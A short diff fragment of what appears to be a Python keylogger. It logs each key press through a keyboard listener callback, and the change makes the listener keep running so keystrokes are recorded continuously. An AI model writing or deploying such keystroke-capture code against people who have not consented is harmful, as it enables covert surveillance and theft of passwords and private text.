@@ -9,4 +9,4 @@ def keypress(Key):
     logging.info(str(Key))
 
 with Listener(on_press = keypress) as listener:
-    print ("in listener")
+    listener.join()
